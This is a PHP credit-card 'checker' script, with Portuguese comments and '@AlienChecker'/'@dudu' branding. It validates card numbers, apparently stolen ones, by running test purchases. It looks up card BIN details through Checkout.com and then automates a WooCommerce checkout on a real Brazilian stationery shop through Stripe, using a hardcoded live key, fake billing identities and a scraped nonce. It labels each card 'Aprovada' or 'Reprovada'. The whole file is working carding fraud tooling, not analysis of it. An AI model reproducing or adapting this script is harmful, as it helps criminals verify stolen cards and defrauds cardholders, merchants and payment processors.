<?php 

error_reporting(0);
sleep(2);

function multiexplode($delimiters, $string)
{

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return $launch;
}
function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$lista = $_GET['lista'];
//$lista = '2306500915663856|03|2030|000';
$explode = multiexplode(array('|',':','/',), $lista);

$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];

$compareano = 2023;

if (strlen($cc) !== 16 || strlen($mes) !== 2 ) {
    echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Cartao Invalido] => [@AlienChecker]';
    return;
}
if (!is_numeric($cc) || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Pare De Tacar Letras No Checker Porfavor!] => [@AlienChecker]';
    return;
}
if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Cartao Invalido] => [@AlienChecker]';
    return;
}
if ($ano < $compareano) {
    echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '] => [Ano Do Cartao E Invalido] => [@AlienChecker]';
    return;
}

$headers = array(
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'referer: https://www.dudu.com.br/produto/lapis-preto-redondo-n2-com-borracha-soho-tilibra-344362',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54',
    'x-requested-with: XMLHttpRequest',
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.checkout.com/tokens");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt(
    $ch,
    CURLOPT_HTTPHEADER,
    array(
        'accept: */*',
        'authorization: pk_wf64cebluwwe46fsf7fgb3l5umk',
        'content-type: application/json',
        'origin: https://js.checkout.com',
        'referer: https://js.checkout.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0'
    )
);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"type":"card","number":"' . $cc . '","expiry_month":11,"expiry_year":2028,"cvv":"483","name":"Limo Soul","billing_address":{"address_line1":"Limoeiro Delasy","city":"Paris","state":"IDF","zip":"75011","country":"FR"},"phone":{"number":"5519996831732"},"preferred_scheme":"","requestSource":"JS"}');
$puxarbins = curl_exec($ch);
$pais = getStr($puxarbins, '"issuer_country":"', '",');
$bandeira = getStr($puxarbins, '"scheme":"', '",');
$tipo = getStr($puxarbins, '"card_type":"', '",');
$nivel = getStr($puxarbins, '"product_type":"', '"');
$banco = getStr($puxarbins, '"issuer":"', '",');
$INFO = "$bandeira $banco $tipo $nivel ($pais)";





$bin = substr($cc, 0,6);
$lestbin = substr($cc, 12,16);

$headers = array(
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'referer: https://www.dudu.com.br/produto/lapis-preto-redondo-n2-com-borracha-soho-tilibra-344362',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54',
    'x-requested-with: XMLHttpRequest',
);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gothampapelaria.com.br/?wc-ajax=cc_add_to_cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'attribute_cor=preta&quantity=1&add-to-cart=6680&product_id=6680&variation_id=6684&action=cc_add_to_cart');
$setCookie = curl_exec($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gothampapelaria.com.br/finalizar-compra/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$checkout = curl_exec($ch);

$nonce = getStr($checkout, 'name="woocommerce-process-checkout-nonce" value="', '"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[name]=Dudu+Lima&billing_details[address][line1]=Avenida+Deputado+Cant%C3%ADdio+Sampaio&billing_details[address][state]=SP&billing_details[address][city]=S%C3%A3o+Paulo&billing_details[address][postal_code]=73813-320&billing_details[address][country]=BR&billing_details[email]=duducomexota%40gmail.com&billing_details[phone]=(98)+99246-0900&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=NA&muid=fc654238-164b-429d-80bb-1108a56482cde4d7f6&sid=9dee818e-ebf7-441c-9968-cc5aef7961ab598304&pasted_fields=number&payment_user_agent=stripe.js%2F0cb5ea3020%3B+stripe-js-v3%2F0cb5ea3020%3B+split-card-element&time_on_page=72035&key=pk_live_51MUxPnCj8wsgp7riW7V3vnBpjpAF3I9IgQLfBF0LP3xMdP1KY14ZU0PENhJkfXOJAyiIKk6PtdYXBPmWysUMVmBk00gxd636wE");
$datastripe = curl_exec($ch);

$idStripe = getStr($datastripe, 'id": "', '"');







$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gothampapelaria.com.br/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, "billing_first_name=Dudu&billing_last_name=Lima&billing_persontype=1&billing_cpf=951.242.528-98&billing_cnpj=&billing_ie=&billing_country=BR&billing_postcode=73813-320&billing_address_1=Avenida+Deputado+Cant%C3%ADdio+Sampaio&billing_number=1&billing_address_2=&billing_neighborhood=&billing_city=S%C3%A3o+Paulo&billing_state=SP&billing_phone=(98)+99246-0900&billing_cellphone=(55)+98992-4609&billing_email=duducomexota%40gmail.com&shipping_first_name=Dudu&shipping_last_name=Lindu&shipping_country=BR&shipping_postcode=73813-320&shipping_address_1=Avenida+Deputado+Cant%C3%ADdio+Sampaio&shipping_number=1&shipping_address_2=&shipping_neighborhood=&shipping_city=S%C3%A3o+Paulo&shipping_state=SP&order_comments=&shipping_method%5B0%5D=local_pickup%3A8&payment_method=stripe&stripe_boleto_tax_id=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=$nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source=$idStripe");
$result = curl_exec($ch);
$resultPayment = getStr($result, '<li>', '<\/li');


if(stripos($result, 'edirect:"ht') ){
  echo '<b><span class="badge badge-success">Aprovada</span> >> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  '.$INFO.' >> <span style="background:  linear-gradient(90deg, #6d4eff 0%, #e62549 100%); color: white;" "="" class="badge bg-gold">[ success ]</span> >> @dudu</b> <br>';
} elseif(stripos($result, "#confirm")) {
  echo '<b><span class="badge badge-success">Aprovada </span> >> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  '.$INFO.' >> <span style="background:  linear-gradient(90deg, #6d4eff 0%, #e62549 100%); color: white;" "="" class="badge bg-gold">[ live com vbv ]</span> >> @dudu</b> <br>';
} elseif(stripos($result, "O seu cart\u00e3o n\u00e3o foi aprovado.")) {
  echo '<b><span class="badge badge-danger badge-glow">REPROVADA </span> >> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  '.$INFO.' >> <span style="background:  linear-gradient(90deg, #6d4eff 0%, #e62549 100%); color: white;" "="" class="badge bg-gold">[ O seu cartao nao foi aprovado. ]</span> >> @dudu</b> <br>';
} else {
      unlink('dudu.txt');
  echo '<b><span class="badge badge-danger badge-glow">REPROVADA </span> >> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  '.$INFO.' >> <span style="background:  linear-gradient(90deg, #6d4eff 0%, #e62549 100%); color: white;" "="" class="badge bg-gold">[ Error interno '.$resultPayment.' ]</span> >> @dudu</b> <br>';
}


